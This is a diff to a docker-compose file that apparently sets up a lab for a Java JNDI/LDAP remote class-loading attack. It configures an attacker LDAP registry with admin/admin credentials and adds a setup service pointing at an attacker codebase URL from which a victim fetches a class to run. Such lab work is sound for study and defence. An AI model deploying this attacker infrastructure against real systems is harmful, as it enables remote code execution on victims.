@@ -11,17 +11,31 @@ services:
   attacker_ldap_registry:
     image: "bitnami/openldap:2.5"
     environment:
-    - LDAP_PORT_NUMBER=1389
-    - LDAP_ROOT=dc=ldap-registry,dc=attacker
-    - LDAP_ADMIN_USERNAME=admin
-    - LDAP_ADMIN_PASSWORD=admin
-    - LDAP_USERS=nobody
-    - LDAP_PASSWORDS=nobody
-    - LDAP_GROUP=users
-    - LDAP_EXTRA_SCHEMAS=cosine,inetorgperson,nis,java,corba
-    - LDAP_ALLOW_ANON_BINDING=yes
+      LDAP_PORT_NUMBER: "1389"
+      LDAP_ROOT: "dc=ldap-registry,dc=attacker"
+      LDAP_ADMIN_USERNAME: "admin"
+      LDAP_ADMIN_PASSWORD: "admin"
+      LDAP_USERS:     "nobody"
+      LDAP_PASSWORDS: "nobody"
+      LDAP_GROUP: "users"
+      LDAP_EXTRA_SCHEMAS: "cosine,inetorgperson,nis,java,corba"
+      LDAP_ALLOW_ANON_BINDING: "yes"
     ports:
     - "1389:1389"
+
+  # The LDAP registry must be initialized with data. The `Reference` must be
+  # placed into the directory. This could easily be done with an LDIF file on
+  # bootstrap, but we write a Kotlin program to do that for us.
+  attacker_ldap_registry_setup:
+    build:
+      context:    ${PWD}/src/attacker_ldap_registry_setup/
+      dockerfile: ${PWD}/docker/gradle-app.Dockerfile
+      args:
+        APP_NAME: "attacker_ldap_registry_setup"
+    environment:
+      JAVA_OPTS: >-
+        -Dattacker-ldap-registry-url=ldap://attacker_ldap_registry:1389/dc=ldap-registry,dc=attacker
+        -Dattacker-codebase-url=http://attacker_codebase:8080/
 
   # The attacker must host a server from which the victim can download a class
   # to execute. In Java parlance, this is called a "codebase".
@@ -29,7 +43,5 @@ services:
   # For our purposes, we just spool up an HTTP server.
   attacker_codebase:
     image: "httpd:alpine"
-    volumes:
-    - "${PWD}/attacker_codebase_files/:/usr/local/apache2/htdocs/"
     ports:
     - ":80"
